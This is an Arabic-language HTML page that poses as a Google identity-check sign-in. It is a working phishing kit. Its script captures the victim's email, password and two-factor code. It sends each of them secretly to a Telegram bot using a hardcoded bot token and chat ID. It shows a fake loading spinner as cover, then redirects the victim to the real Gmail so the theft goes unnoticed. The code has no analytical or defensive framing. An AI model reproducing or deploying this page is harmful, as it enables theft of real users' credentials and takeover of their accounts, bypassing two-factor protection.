<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - التحقق من الهوية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 380px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        #step2 { display: none; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70" alt="Google">
    
    <div id="step1">
        <h1>تسجيل الدخول</h1>
        <p>استخدم حسابك على Google</p>
        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button class="btn" onclick="goToStep2()">التالي</button>
    </div>

    <div id="step2">
        <h1>التحقق بخطوتين</h1>
        <p>أدخل الرمز المكون من 6 أرقام الذي أرسلناه إلى جوالك</p>
        <div class="loader" id="loader"></div>
        <input type="number" id="code" placeholder="أدخل الرمز G-XXXXXX">
        <button class="btn" onclick="finish()">تأكيد</button>
    </div>
</div>

<script>
    const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
    const CHAT_ID = "5811700860";

    function goToStep2() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        
        if(email.includes('@') && pass.length > 4) {
            // إرسال البيانات الأولى سراً
            sendToBot(`🎯 صيد Gmail (مرحلة 1):\n👤 الإيميل: ${email}\n🔑 الباسورد: ${pass}`);
            
            // إظهار التحميل للتمويه
            document.getElementById('step1').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('step2').style.display = 'block';
            
            setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 2000);
        } else { alert("خطأ في البيانات!"); }
    }

    function finish() {
        const code = document.getElementById('code').value;
        sendToBot(`🛡️ كود التحقق (مرحلة 2):\n🔢 الرمز: ${code}`);
        
        // التحويل النهائي لـ Gmail الحقيقي
        window.location.href = "https://mail.google.com";
    }

    function sendToBot(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
        });
    }
</script>
</body>
</html>
